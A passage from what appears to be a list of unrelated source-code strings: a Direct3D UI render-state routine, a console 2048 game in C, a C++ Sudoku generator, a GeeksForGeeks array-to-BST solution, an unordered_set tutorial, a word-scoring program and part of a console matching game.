s_lpD3DDev->SetRenderState(D3DRS_ZENABLE, D3DZB_FALSE);\n\tif (TRUE != s_sRSFU.dwAlphaBlend) s_lpD3DDev->SetRenderState(D3DRS_ALPHABLENDENABLE, TRUE);\n\tif (D3DBLEND_SRCALPHA != s_sRSFU.dwSrcBlend) s_lpD3DDev->SetRenderState(D3DRS_SRCBLEND, D3DBLEND_SRCALPHA);\n\tif (D3DBLEND_INVSRCALPHA != s_sRSFU.dwDestBlend) s_lpD3DDev->SetRenderState(D3DRS_DESTBLEND, D3DBLEND_INVSRCALPHA);\n\tif (FALSE != s_sRSFU.dwFog) s_lpD3DDev->SetRenderState(D3DRS_FOGENABLE   , FALSE);\t// 2d\ub3c4 fog\ub97c \uba39\ub294\ub2e4 \u3161.\u3161;\n\tif (D3DTEXF_POINT != s_sRSFU.dwMagFilter ) s_lpD3DDev->SetTextureStageState(0, D3DTSS_MAGFILTER,   D3DTEXF_POINT);\n\tif (D3DTEXF_POINT != s_sRSFU.dwMinFilter ) s_lpD3DDev->SetTextureStageState(0, D3DTSS_MINFILTER,   D3DTEXF_POINT);\n\tif (D3DTEXF_NONE != s_sRSFU.dwMipFilter ) s_lpD3DDev->SetTextureStageState(0, D3DTSS_MIPFILTER,   D3DTEXF_NONE);\n}\n\nvoid CN3UIManager::RenderStateRestore()\n{\n#ifdef _DEBUG\n\t__ASSERT(TRUE == s_sRSFU.bSet, \"\uc774\uc804\uc5d0 RenderStateSet()\ud568\uc218\ub97c \ud638\ucd9c\ud558\uc9c0 \uc54a\uc558\uc2b5\ub2c8\ub2e4.\");\n\ts_sRSFU.bSet = FALSE;\n#endif\n\n\t// restore\n\tif (D3DZB_FALSE != s_sRSFU.dwZEnable) s_lpD3DDev->SetRenderState(D3DRS_ZENABLE, s_sRSFU.dwZEnable);\n\tif (TRUE != s_sRSFU.dwAlphaBlend) s_lpD3DDev->SetRenderState(D3DRS_ALPHABLENDENABLE, s_sRSFU.dwAlphaBlend);\n\tif (D3DBLEND_SRCALPHA != s_sRSFU.dwSrcBlend) s_lpD3DDev->SetRenderState(D3DRS_SRCBLEND, ",
    "#include \"stdio.h\"\r\n#include \"stdlib.h\"\r\n#include \"time.h\"\r\n#define N 4//\u65b9\u9663\u908a\u9577 \r\n#define WIN 2048//\u904a\u6232\u7372\u52dd\u76ee\u6a19\r\n\r\nvoid output(int (*a)[N]){//\u8f38\u51fa4*4\u8868\u683c\uff0c \r\n\tint i,j;\r\n\t\tprintf(\"\\n\");\r\n\t\tprintf(\"\u250f\u2501\u2501\u2501\u2501\u2533\u2501\u2501\u2501\u2501\u2533\u2501\u2501\u2501\u2501\u2533\u2501\u2501\u2501\u2501\u2513\");//\u9802\u908a\u6846 \r\n\t\tprintf(\"\\n\");\r\n\tfor(i=0;i<N;i++){printf(\"\u2503\") ;\r\n\t\tfor(j=0;j<N;j++){\r\n\t\t\tif(a[i][j]==0) printf(\"    \u2503\");//\u5982\u679c\u6578\u503c\u70ba\u96f6\u5247\u8f38\u51fa\u7a7a\u767d \r\n\t\t\telse  printf(\"%4d\u2503\",a[i][j]);\r\n\t\t}\r\n\t\tif(i!=3)\r\n\t\tprintf(\"\\n\u2523\u2501\u2501\u2501\u2501\u254b\u2501\u2501\u2501\u2501\u254b\u2501\u2501\u2501\u2501\u254b\u2501\u2501\u2501\u2501\u252b\\n\");//\u5c64\u908a\u6846 \r\n\t\telse \tprintf(\"\\n\u2517\u2501\u2501\u2501\u2501\u253b\u2501\u2501\u2501\u2501\u253b\u2501\u2501\u2501\u2501\u253b\u2501\u2501\u2501\u2501\u251b\\n\");//\u5e95\u908a\u6846 \r\n\t}\r\n}  \r\nint sj24(){//\u7372\u53d6\u96a8\u6a5f\u65782\u62164 \r\n\tint s[8]={2,2,2,2,2,2,2,4},i,j;//\u4ee5\u6982\u73877:1\u5efa\u7acb2\u548c4\u7684\u96a8\u6a5f\u6578\u7a2e\u5b50 \r\n\tsrand((unsigned)time(NULL));\r\n\ti=(rand())%8;//\u4ee5\u6642\u9593\u70ba\u7a2e\u5b50\u5f97\u52300~7\u7684\u96a8\u6a5f\u6578 \r\n\treturn s[i];\r\n}\r\nint input(){//\u8f38\u5165\u4e0a\u4e0b\u5de6\u53f3\u6307\u4ee4\u63a7\u5236\u904a\u6232 \r\n\tint m;\r\n\tif(getch()==0xE0){ //\u5c0d\u9375\u5165\u7684\u547d\u4ee4\u9032\u884c\u8b58\u5225 \r\n\t\tswitch(getch()){//\u5341\u4f4d1\u8868\u793a\u6c34\u5e73\u79fb\u52d52\u8868\u793a\u8c4e\u76f4\u79fb\u52d5\uff0c\u5404\u4f4d1\u8868\u793a\u5411\u5c0f\u5ea7\u6a19\u79fb\u52d52\u8868\u793a\u5411\u5927\u5ea7\u6a19\u79fb\u52d5 \r\n\t\t\tcase 72: return 21;break;//\u8f38\u5165\u4e0a \r\n\t\t\tcase 80: return 22;break;//\u8f38\u5165\u4e0b \r\n\t\t\tcase 75: return 11;break;//\u8f38\u5165\u53f3 \r\n\t\t\tcase 77: return 12;break;//\u8f38\u5165\u5de6\r\n\t\t\tdefault:{//\u82e5\u547d\u4ee4\u4e0d\u7b26\u5408\u8981\u6c42\uff0c\u904b\u7528\u905e\u8ff4\u91cd\u65b0\u5f97\u5230\u547d\u4ee4 \r\n\t\t\t\tprintf(\"\u8acb\u8f38\u5165\u6b63\u78ba\u7684\u6307\u4ee4\uff01(\uff5e\uffe3(OO)\uffe3)\u30d6\\n\");\r\n\t\t\t\treturn input();\t\r\n\t\t\t}\r\n\t}\r\n}\r\n\telse {//\u82e5\u547d\u4ee4\u4e0d\u7b26\u5408\u8981\u6c42\uff0c\u904b\u7528\u905e\u8ff4\u91cd\u65b0\u5f97\u5230\u547d\u4ee4 \r\n\t\tprintf(\"\u8acb\u8f38\u5165\u6b63\u78ba\u7684\u6307\u4ee4\uff01(\uff5e\uffe3(OO)\uffe3)\u30d6\\n\\n\");\r\n\t\treturn input();\r\n\t\t}\r\n}\r\nvoid move(int (*a)[N]){ //\u901a\u904e\u547c\u53ebinput\u51fd\u5f0f\u5f97\u5230\u6b63\u78ba\u7684\u547d\u4ee4\uff0c\u6839\u64da\u547d\u4ee4\u79fb\u52d5\u8cc7\u6599 \r\n\tint x,i,j,k,s[N][N],t=0;\r\n \tx=input();\r\n \tfor(i=0;i<N;i++){\r\n\t\tfor(j=0;j<N;j++) s[i][j]=a[i][j];//\u62f7\u8c9d\u79fb\u52d5\u524d\u65b9\u9663\u65b9\u4fbf\u4ee5\u5f8c\u6aa2\u67e5 \r\n\t}\r\n \tif(x/10==1){//\u6c34\u5e73\u79fb\u52d5 \r\n \t\tif(x%10==1){//\u5411\u5c0f\u5ea7\u6a19\u79fb\u52d5 \r\n\t\t \tfor(i=0;i<N;i++)\r\n\t\t\t{\r\n\t\t\t\tfor(k=0;k<3;k++)\r\n\t\t\t\t{\r\n\t\t\t\t\t//  \u6838\u5fc3\u6f14\u7b97\u6cd5\u4ecb\u7d39 \r\n\t\t \t\t\tfor(j=N-1;j>0;j--)\r\n\t\t\t\t\t{           //\u7b2c\u4e00\u6b65\uff0c\u5148\u5c07\u4e00\u6392\u8cc7\u6599\u91cd\u5f8c\u5f80\u524d\u4e00\u500b\u500b\u5411\u524d\u63a8\uff08\u9664\u53bb\u524d\u9762\u548c\u4e2d\u9593\u76840\uff09 \r\n\t\t\t\t\t\tif(a[i][j-1]==0) {        //\u70ba\u78ba\u4fdd\u79fb\u52d5\u5b8c\u5168\u7d93\u63a8\u7406\u6700\u591a3\u6b21\u5b8c\u6210\u6240\u6709\u79fb\u52d5\u6240\u6709\u57f7\u884c3\u6b21\u8a72\u6f14\u7b97\u6cd5 \r\n\t\t\t\t\t\ta[i][j-1]=a[i][j];        //\u7b2c\u4e8c\u6b65\uff0c\u5c07\u76f8\u9130\u5169\u5169\u76f8\u540c\u7684\u6578\u76f8\u52a0\u8ce6\u503c\u524d\u8005\u5f8c\u8005\u8ce60 \r\n\t\t\t\t\t\ta[i][j]=0;                // \u7b2c\u4e09\u90e8\uff0c\u91cd\u8907\u7b2c\u4e00\u6b65\u64cd\u4f5c\u53bb\u9664\u65b0\u7522\u751f\u76840\uff0c\u7e3d\u64cd\u4f5c\u5b8c\u6210 \r\n \t\t\t\t\t}                         //PS:\u6240\u6709\u65b9\u5411\u6f14\u7b97\u6cd5\u539f\u7406\u76f8\u540c \r\n \t     \t\t}\r\n \t     \t\t}\r\n\t\t \t\tfor(j=0;j<N-1;j++){\r\n \t\t\t\t\tif(a[i][j]==a[i][j+1]) {\r\n\t\t\t\t\t\ta[i][j]=a[i][j]+a[i][j+1];\r\n\t\t\t\t\t\ta[i][j+1]=0;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t \t\tfor(k=0;k<3;k++){\r\n\t\t \t\tfor(j=N-1;j>0;j--){\r\n \t\t\t\t\tif(a[i][j-1]==0) {\r\n\t\t\t\t\ta[i][j-1]=a[i][j];\r\n \t\t\t\t\ta[i][j]=0;\r\n \t\t\t\t\t}\r\n \t     \t\t}\r\n \t     \t\t}\r\n\t\t \t}\t \r\n\t\t }\r\n\t\t else{//\u5411\u5927\u5ea7\u6a19\u79fb\u52d5 \r\n\t\t \tfor(i=0;i<N;i++){for(k=0;k<3;k++){\r\n\t\t \t\tfor(j=0;j<N-1;j++){\r\n \t\t\t\t\tif(a[i][j+1]==0) {\r\n\t\t\t\t\ta[i][j+1]=a[i][j];\r\n \t\t\t\t\ta[i][j]=0;\r\n \t\t\t\t\t}\r\n \t     \t\t}\r\n \t     \t\t}\r\n\t\t\t\tfor(j=N-1;j>0;j--){\r\n \t\t\t\t\tif(a[i][j]==a[i][j-1]) {\r\n\t\t\t\t\t\ta[i][j]=a[i][j]+a[i][j-1];\r\n\t\t\t\t\t\ta[i][j-1]=0;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t \t\tfor(k=0;k<3;k++){\r\n\t\t \t\tfor(j=0;j<N-1;j++){\r\n \t\t\t\t\tif(a[i][j+1]==0) {\r\n\t\t\t\t\ta[i][j+1]=a[i][j];\r\n \t\t\t\t\ta[i][j]=0;\r\n \t\t\t\t\t}\r\n \t     \t\t}\r\n \t     \t\t}\r\n\t\t \t}\t \r\n\t\t }\r\n\t }\r\n \telse{//\u8c4e\u76f4\u79fb\u52d5 \r\n \t\tif(x%10==1){//\u5411\u5c0f\u5ea7\u6a19\u79fb\u52d5 \r\n\t\t for(i=0;i<N;i++){for(k=0;k<3;k++){\r\n\t\t\t\tfor(j=N-1;j>0;j--){\r\n \t\t\t\t\tif(a[j-1][i]==0) {\r\n\t\t\t\t\ta[j-1][i]=a[j][i];\r\n \t\t\t\t\ta[j][i]=0;\r\n \t\t\t\t\t}\r\n \t     \t\t}\r\n \t     \t\t}\r\n\t\t\t\tfor(j=0;j<N-1;j++){\r\n \t\t\t\t\tif(a[j][i]==a[j+1][i]) {\r\n\t\t\t\t\t\ta[j][i]=a[j][i]+a[j+1][i];\r\n\t\t\t\t\t\ta[j+1][i]=0;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t \t\tfor(k=0;k<3;k++){\r\n\t\t\t\tfor(j=N-1;j>0;j--){\r\n \t\t\t\t\tif(a[j-1][i]==0) {\r\n\t\t\t\t\ta[j-1][i]=a[j][i];\r\n \t\t\t\t\ta[j][i]=0;\r\n \t\t\t\t\t}\r\n \t     \t\t}\r\n \t     \t\t}\t\r\n\t\t\t}\r\n\t\t }\r\n\t\t else{//\u5411\u5927\u5ea7\u6a19\u79fb\u52d5 \r\n\t\t \tfor(i=0;i<N;i++){for(k=0;k<3;k++){\r\n\t\t \t\tfor(j=0;j<N-1;j++){\r\n \t\t\t\t\tif(a[j+1][i]==0) {\r\n\t\t\t\t\ta[j+1][i]=a[j][i];\r\n \t\t\t\t\ta[j][i]=0;\r\n \t\t\t\t\t}\r\n \t     \t\t}\r\n \t     \t\t}\r\n\t\t\t\tfor(j=N-1;j>0;j--){\r\n \t\t\t\t\tif(a[j][i]==a[j-1][i]) {\r\n\t\t\t\t\t\ta[j][i]=a[j][i]+a[j-1][i];\r\n\t\t\t\t\t\ta[j-1][i]=0;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t \t\tfor(k=0;k<3;k++){\r\n\t\t \t\tfor(j=0;j<N-1;j++){\r\n \t\t\t\t\tif(a[j+1][i]==0) {\r\n\t\t\t\t\ta[j+1][i]=a[j][i];\r\n \t\t\t\t\ta[j][i]=0;\r\n \t\t\t\t\t}\r\n \t     \t\t}\r\n \t     \t\t}\r\n\t\t \t}\r\n\t\t }\r\n\t }\r\n\t for(i=0;i<N;i++){//\u6aa2\u67e5\u662f\u5426\u70ba\u6709\u6548\u79fb\u52d5 \r\n\t\tfor(j=0;j<N;j++) {\r\n\t\t\tif (s[i][j]!=a[i][j]) t=1;\r\n\t\t}\r\n\t\t}\r\n\t\tif(t){\r\n\t\t\tbegin(a);\t\r\n\t\t\tSleep(60);//\u70ba\u8b93\u73a9\u5bb6\u77e5\u9053\u79fb\u52d5\u5f8c\u96a8\u6a5f\u6578\u51fa\u73fe\u4f4d\u7f6e\uff0c\u8b93\u5176\u5ef6\u9072\u51fa\u73fe \r\n\t\t\tget(a);\t\r\n\t\t\tbegin(a);\r\n\t\t}  \r\n\t\telse printf(\"\u9078\u64c7\u5176\u4ed6\u65b9\u5411\u8a66\u8a66(\uffe2_\uffe2)\"); \r\n}\r\nvoid get(int (*a)[N]){//\u57284*4\u8868\u683c\u4e2d\u7a7a\u677f\u4f4d\u7f6e\u96a8\u6a5f\u7372\u5f97\u6578\u5b57 \r\n\tint i,j;\r\n\tsrand((unsigned)time(NULL));\r\n\tdo{\r\n\t\t\ti=(rand())%4;\r\n\t\t\tj=(rand())%4;\t\r\n\t} while(a[i][j]!=0); \r\n\t a[i][j]=sj24();\r\n}  \r\nvoid begin(int (*a)[N]){//\u6e05\u5c4f\u4e26\u5217\u5370\u958b\u982d \r\n\tsystem(\"cls\"); \r\n\tprintf(\"        \u5c0f\u904a\u62322048\\n\\n  \");\r\n\tprintf(\"   \u9375\u5165\u4e0a\u4e0b\u5de6\u53f3\u63a7\u5236\\n\");\r\n\toutput(a);\r\n} \r\nint test(int (*a)[N]){//\u5224\u65b7\u662f\u5426\u904a\u6232\u5b8c\u6210 \r\n\tint i,j,k=0,m=0,n=0;\r\n\t\tprintf(\"\\n\");\r\n\tfor(i=0;i<N;i++){\r\n\t\tfor(j=0;j<N;j++){\r\n\t\t\tif(a[i][j]==0)m=1;//\u6aa2\u67e5\u65b9\u9663\u4e2d\u662f\u5426\u67090 \r\n\t\t\tif(a[i][j]==WIN)k=1; //\u6aa2\u67e5\u65b9\u9663\u4e2d\u662f\u5426\u6709\u76ee\u6a19\u6578\u5b57 \r\n\t\t}\r\n\t}\r\n\tif (k){//\u5982\u679c\u767c\u73fe\u76ee\u6a19\u6578\u5b57\u5224\u5b9a\u904a\u6232\u7372\u52dd \r\n\t\tprintf(\"YOU WIN! \\(^o^)/YES!\"); \r\n\t\treturn 0;\r\n\t}\r\n\telse{\r\n\t\tif(!m){//\u5982\u679c\u65b9\u9663\u4e2d\u71210\u4e14\u7121\u76f8\u9130\u6578\u5b57\u76f8\u7b49\u5247\u5224\u5b9a\u904a\u6232\u5931\u6557\uff0c\u53cd\u4e4b\u904a\u6232\u7e7c\u7e8c \r\n\t\t \tfor(i=0;i<N;i++){\r\n\t\t\t\tfor(j=0;j<N-1;j++)\r\n\t\t\t\t\tif(a[i][j]==a[i][j+1]||a[j][i]==a[j+1][i]) n=1;\r\n\t\t\t}\r\n\t   \tif(n) return 1;\r\n\t\telse{\r\n\t\t\tprintf(\"GAME OVER!\u3012\u25bd\u3012\");\r\n\t\t\treturn 0;\r\n\t\t\t}\r\n\t\t}\r\n\t\telse return 1;   \r\n\t}\t\t \r\n}\r\nvoid main(){\r\n\t int a[N][N]={0};\r\n\t get(a);get(a);begin(a);//\u8d77\u59cb\u6642\u65b9\u9663\u6709\u5169\u500b\u96a8\u6a5f\u6578 \r\n\twhile(test(a)) move(a); //\u53ea\u6709\u901a\u904etset\u51fd\u5f0f\u6aa2\u67e5\u624d\u80fd\u7e7c\u7e8c\u904a\u6232 \r\n} //\u8b1d\u8b1d ",
    "#include <iostream>\n#include <cmath>\n#include <cstdlib>\n#include <ctime>\n#include <vector>\nusing namespace std;\n\nconst int STANDARD_SIZE = 9;\nconst int GIGANT_SIZE = 16;\nconst char VALUES[16] = {'1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G'};\n\nvoid horizontal(vector<vector<char>>& sudokuTable, const int PUZZLE_SIZE) {\n    //borders could be written without this loops AS WELL :)\n    string horizont = (PUZZLE_SIZE == 16) ? \"====\" : \"===\";\n    if(PUZZLE_SIZE == 16) {//nuthin special, for beauty\n        for(int i = 0; i < PUZZLE_SIZE - 6; i++)\n            cout << horizont;\n        cout << \"==\" << endl;\n    }\n    else {\n        for(int i = 0; i < PUZZLE_SIZE; i++)\n            cout << horizont;\n        cout << endl;\n    }\n}\n\nvoid draw(vector<vector<char>>& sudokuTable, const int PUZZLE_SIZE) {\n\n    const string sides = \"||\";\n    int cntHorizontal = (PUZZLE_SIZE == 16) ? 3 : 2;\n    int cntVertical = (PUZZLE_SIZE == 16) ? 3 : 2;\n    const int grid = cntHorizontal;\n\n    for(int i = 0; i < PUZZLE_SIZE; i++) {\n        if(cntHorizontal == grid) {\n            horizontal(sudokuTable, PUZZLE_SIZE);\n            cntHorizontal = 0;\n        } else {\n            cntHorizontal++;\n        }\n\n        int cntVertical = grid;\n        for(int j = 0; j < PUZZLE_SIZE; j++) {\n            if(cntVertical == grid) {\n                cout << sides;\n                cntVertical = 0;\n            } else cntVertical ++;\n\n            cout << sudokuTable[i][j] << \" \";\n\n            if(j == 8 && grid == 2) cout << sides;\n            if(j == 15 && grid == 3) cout << sides;\n        }\n        cout << endl;\n\n        if(i == 8 && grid == 2) horizontal(sudokuTable, PUZZLE_SIZE);\n        if(i == 15 && grid == 3) horizontal(sudokuTable, PUZZLE_SIZE);\n    }\n}\n\n\nbool isValid(int rowz, int col, int val, vector<vector<char>>& sudokuTable, const int PUZZLE_SIZE) {\n    // Checking val existence on a column/row\n    for(int c =  0; c < PUZZLE_SIZE; c++)  \n        if(sudokuTable[rowz][c] == val) return false;\n\n    for(int r = 0; r < PUZZLE_SIZE; r++)  \n        if(sudokuTable[r][col] == val) return false;\n\n    int grid = 3;\n    if(PUZZLE_SIZE == 16) grid = 4;\n\n    int gridRow = floor(rowz /  grid) *  grid, gridCol = floor(col /  grid) *  grid;\n\n    for(int r = gridRow; r < gridRow +  grid; r++) {\n        for(int c = gridCol; c < gridCol +  grid; c++) {\n            if(sudokuTable[r][c] == val) return false;\n        }\n    }\n\n    return true;\n}\n\nbool startGame(int rowz, int col, vector<vector<char>>& sudokuTable,  const int PUZZLE_SIZE) {\n\n    if(rowz == PUZZLE_SIZE - 1 && col == PUZZLE_SIZE) \n        return true;\n\n    if(col == PUZZLE_SIZE) {\n        col = 0;\n        rowz++;\n    }\n\n    if(sudokuTable[rowz][col] > '0') return startGame(rowz, col + 1, sudokuTable, PUZZLE_SIZE);\n    \n    for(int i = 0; i < PUZZLE_SIZE; i++) {\n        if(isValid(rowz,col, VALUES[i], sudokuTable, PUZZLE_SIZE)) {\n            sudokuTable[rowz][col] = VALUES[i];\n             if(startGame(rowz, col + 1, sudokuTable, PUZZLE_SIZE)) {\n                return true;\n             }\n        }\n\n        sudokuTable[rowz][col] = '0';\n    }\n\n    return false;\n}\n\nint getRandomNumber(int min, int max) {\n    return rand() % (max - min) + min;\n}\n\nint getRandomNumber(const int PUZZLE_SIZE) {\n    return (rand() % PUZZLE_SIZE);\n}\n\nvoid toChar(char *c, int digit ) {\n    switch (digit) {\n        case 10:\n            *c = 'A';\n            break;\n        case 11:\n            *c = 'B';\n            break;\n        case 12:\n            *c = 'C';\n            break;\n        case 13:\n            *c = 'D';\n            break;\n        case 14:\n            *c = 'E';\n            break;\n        case 15:\n            *c = 'F';\n            break;\n        case 16:\n            *c = 'G';\n            break;\n        \n        default:\n            break;\n    }\n}\n\nvoid generatePuzzle(int level, vector<vector<char>>& sudokuTable, const int  PUZZLE_SIZE) {\n    int emptyCell = pow(PUZZLE_SIZE, 2) - level;\n    cout << \"Count empty cell \" << emptyCell << endl; //Extra !!!\n\n    while(emptyCell > 0) {\n        int randomRow, randomColumn, digit;\n        randomRow = getRandomNumber(PUZZLE_SIZE);\n        randomColumn = getRandomNumber(PUZZLE_SIZE);\n        digit = getRandomNumber(PUZZLE_SIZE) + 1;\n\n        char c;\n        if(digit < 10) c = char(digit + 48);\n        else {\n            toChar(&c, digit);\n        }\n\n        if(sudokuTable[randomRow][randomColumn] == '0') {\n            bool valid = false;\n            while(!valid) {\n                if(sudokuTable[randomRow][randomColumn] != '0') {\n                    sudokuTable[randomRow][randomColumn] = '0';\n                    valid = true;\n\n                    // cout << \"Row \" << randomRow << '\\t' << randomColumn << '\\t' << digit << endl;\n                }\n\n                randomRow = getRandomNumber(PUZZLE_SIZE);\n                randomColumn = getRandomNumber(PUZZLE_SIZE);\n                digit = getRandomNumber(PUZZLE_SIZE);\n            }\n\n        }\n        else {",
    "//! GeeksForGeeks Question Array to BST\r\n\r\n//? link: https://www.geeksforgeeks.org/problems/array-to-bst4443/1?itm_source=geeksforgeeks&itm_medium=article&itm_campaign=bottom_sticky_on_article\r\n\r\n#include<bits/stdc++.h>\r\nusing namespace std;\r\nstruct Node{\r\n    int data;\r\n    Node* left; Node* right;\r\n    Node(int val): data(val), left(NULL), right(NULL) {};\r\n};\r\nNode* inordertobst(int start,int end,vector<int>& nums){\r\n    if(start>end) return NULL;\r\n    int mid=(start+end)/2;\r\n    Node* root=new Node(nums[mid]);\r\n    root->left=inordertobst(start,mid-1,nums);\r\n    root->right=inordertobst(mid+1,end,nums);\r\n    return root;\r\n}\r\nvoid pre(Node* root,vector<int>& ans){\r\n    if(root==NULL) return;\r\n    ans.push_back(root->data);\r\n    pre(root->left,ans);\r\n    pre(root->right,ans);\r\n}\r\nclass Solution{\r\n    public:\r\n    vector<int> solve(vector<int>& nums){\r\n        Node* root=NULL;\r\n        root=inordertobst(0,nums.size()-1,nums);\r\n        vector<int> ans;\r\n        pre(root,ans);\r\n        return ans;\r\n    }\r\n};\r\nint main(){\r\n    int t; cin>>t;\r\n    while(t--){\r\n        int n; cin>>n;\r\n        vector<int> nums(n);\r\n        for(int i=0;i<n;i++){\r\n            cin>>nums[i];\r\n        }\r\n        Solution s;\r\n        vector<int> ans=s.solve(nums);\r\n        for(auto i:nums){\r\n            cout<<i<<\" \";\r\n        }\r\n        cout<<endl;\r\n    }\r\n    return 0;\r\n}\r\n\r\n\r\n\r\n//* Alternative Solution for same question in leetcode\r\n//? link: https://leetcode.com/problems/convert-sorted-array-to-binary-search-tree/\r\n\r\n/*\r\nclass Solution{\r\n    public:\r\n    TreeNode* sortedArrayToBST(vector<int>& nums){\r\n        int n=nums.size;\r\n        if(n==0) return NULL;\r\n        vector<int> left {}, right{};\r\n        int mid=n/2;\r\n        for(int i=0; i<nums.size();i++){\r\n            if(i<mid){\r\n                left.push_back(nums[i]);\r\n            }\r\n            else right.push_back(nums[i]);\r\n        }\r\n        TreeNode* root=new TreeNode(nums[mid]);\r\n        root->left=sortedArrayToBST(left);\r\n        root->right=sortedArrayToBST(right);\r\n        return root;\r\n    }\r\n}\r\n*/",
    "#include<bits/stdc++.h>\nusing namespace std;\n/*\n\n    // Topic-> Unordered Set\n    1. insert()\n    2. find()\n    3. count()\n    4. erase()\n\n    Features of Set\n    -> Sorted Order\n    -> Unique Elements\n|--------------------|-----------------|\n|           Set      |   Unordered Set |\n|         Sorted     |      Unsorted   |\n|           BST      |      Hashing    |\n|Avg. ->  O(logN)    |         O(1)    |\n|Worst ->   O(N)     |         O(N)    |\n|--------------------|-----------------|\n\n*/\nint main()\n{\n  unordered_set<int> s;\n \n  // insert()  \n  s.insert(5); \n  s.insert(3); \n  s.insert(4); \n  s.insert(2); \n  s.insert(1); \n\n  // find()\n  auto x = s.find(4);  // O(logN)\n  cout<< *x<<endl;\n\n  // count()\n  if(s.count(3)){\n    cout<<\"present\\n\";\n  }\n  else{\n    cout<<\"absent\\n\";\n  }\n  // traversing set\n  for(auto x:s){\n    cout<<x<<\" \";\n  }\n  cout<<endl;\n  // erase()\n  s.erase(3); // O(logN)\n  for(auto x:s){\n    cout<<x<<\" \";\n  }\n  cout<<endl;\n  s.erase(x); // O(1)\n  for(auto x:s){\n    cout<<x<<\" \";\n  }\n}",
    "#include <cstdlib>\n#include <iostream>\n#include \"Logic/Logic.hpp\"\n#include \"DataTypes/DataTypes.hpp\"\n\nint main(int argumentsLength, char ** arguments)\n{\t// validate program arguments\n\tLogic::ValidateArguments(argumentsLength, arguments);\n\n\t// make sure the global locale supports unicode characters\n\tLogic::ApplyUnicodeLocale();\n\n\t// obtain the file path from said arguments\n\tstd::string filePath = Logic::ObtainFilePathFromArguments(arguments);\n\n\t// create a word list and go through all required algorithms\n\tauto wordList = DataTypes::WordList(filePath);\n\twordList.RemoveDuplicates();\n\twordList.CountScores();\n\twordList.SortByScores();\n\n\t// obtain a result from the word list\n\tDataTypes::EvaluatedWords_t result = wordList.GetWords();\n\n\t// obtain the path to the .count.txt file\n\tstd::string countFilePath = Logic::ObtainCountFilePathFromFilePath(filePath);\n\n\t// output the resulted information into the .count.txt file\n\tLogic::OutputListToFile(countFilePath, result);\n\n\t// calculate the total file score\n\tint totalScore = Logic::SumListScore(result);\n\n\t// output basic result information to the console\n\tLogic::OutputResultInfoToConsole(result.size(), totalScore, countFilePath);\n\n\t// success\n\treturn EXIT_SUCCESS;\n}\n",
    "\ufeff#include<iostream>\n#include\"Interface.h\"\n#include\"Controller.h\"\n#include\"Game.h\";\n#include<algorithm>\n#include<conio.h>\n#include<map>\n#include<utility>\n#include<string>\n\n//For time\n#include <chrono>\n#include <iomanip>\n#include <thread>\n#include <atomic>\nusing namespace std;\n\n//Create board and add character, key, index, coordinate to the board\nvoid Game::CreateBoard(Board**& board, char**& c, int row, int col)\n{\n\tAddCharToButton(c, row, col);\n\tboard = new Board * [row + 2];\n\tfor (int i = 0; i <= row + 1; i++)\n\t{\n\t\tboard[i] = new Board[col + 2];\n\t}\n\tfor (int i = 0; i <= row + 1; i++)\n\t{\n\t\tfor (int j = 0; j <= col + 1; j++)\n\t\t{\n\t\t\tif (i == 0 || j == 0 || i == row + 1 || j == col + 1)\n\t\t\t{\n\t\t\t\tboard[i][j].c = ' ';\n\t\t\t\tboard[i][j].coordinate = { -1, -1 };\n\t\t\t\tboard[i][j].index = { -1, -1 };\n\t\t\t\tboard[i][j].key = 0;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tboard[i][j].c = c[i - 1][j - 1];\n\t\t\t\tboard[i][j].index = { i, j };\n\t\t\t\tboard[i][j].coordinate = { 7 * (j - 1) + 7, 5 * (i - 1) + 3 };\n\t\t\t\tboard[i][j].key = 1;\n\t\t\t}\n\t\t}\n\t}\n\t//Delete character after add to board\n\tDeleteChar(c, row);\n}\n//Draw button \nvoid Game::DrawButton(int row, int col)\n{\n\tfor (int i = 0; i < row; i++)\n\t{\n\t\tfor (int j = 0; j < col; j++)\n\t\t{\n\t\t\tController::PrintRectangle(7 * j + 4, 5 * i + 1, 7, 5);\n\t\t}\n\t}\n}\n//Draw board with specific width and height\nvoid Game::DrawBoard(int x, int y, int width, int height)\n{\n\tInterface::GotoXY(x, y);\n\t//Draw first row of rectangle\n\tputc(201, stdout);\n\tfor (int i = 1; i < width - 1; i++)\n\t{\n\t\tputc(205, stdout);\n\t}\n\tputc(187, stdout);\n\n\t//Draw left row of rectangle\n\tfor (int i = 1; i < height - 1; i++)\n\t{\n\t\tInterface::GotoXY(x, y + i);\n\t\tputc(186, stdout);\n\t}\n\tInterface::GotoXY(x, y + height - 1);\n\tputc(200, stdout);\n\n\t//Draw last row of rectangle\n\tfor (int i = 1; i < width - 1; i++)\n\t{\n\t\tputc(205, stdout);\n\t}\n\tputc(188, stdout);\n\n\t//Draw last row of rectangle\n\tfor (int i = 1; i < height - 1; i++)\n\t{\n\t\tInterface::GotoXY(x + width - 1, y + i);\n\t\tputc(186, stdout);\n\t}\n\tcout << endl;\n\tcout << endl;\n}\n//Create character to button\nvoid Game::AddCharToButton(char**& c, int row, int col)\n{\n\tsrand(time(NULL));\n\tif (row == 4 && col == 4)\n\t{\n\t\tc = new char* [4];\n\t\tfor (int i = 0; i < 4; i++)\n\t\t{\n\t\t\tc[i] = new char[5];\n\t\t}\n\t\tfor (int i = 0; i < 4; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < 4; j++)\n\t\t\t{\n\t\t\t\tc[i][j] = 65 + i;\n\t\t\t}\n\t\t}\n\t\tfor (int i = 0; i < 4; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < 4; j++)\n\t\t\t{\n\t\t\t\tswap(c[i][j], c[rand() % 4][rand() % 4]);\n\t\t\t}\n\t\t}\n\t\tfor (int i = 0; i < 4; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < 4; j++)\n\t\t\t{\n\t\t\t\tInterface::GotoXY(7 * j + 7, 5 * i + 3);\n\t\t\t\tcout << c[i][j];\n\t\t\t}\n\t\t}\n\t}\n\telse if (row == 6 && col == 6)\n\t{\n\t\tc = new char* [6];\n\t\tfor (int i = 0; i < 6; i++)\n\t\t{\n\t\t\tc[i] = new char[7];\n\t\t}\n\t\tint x = 0, cnt = 0;\n\t\tfor (int i = 0; i < 6; 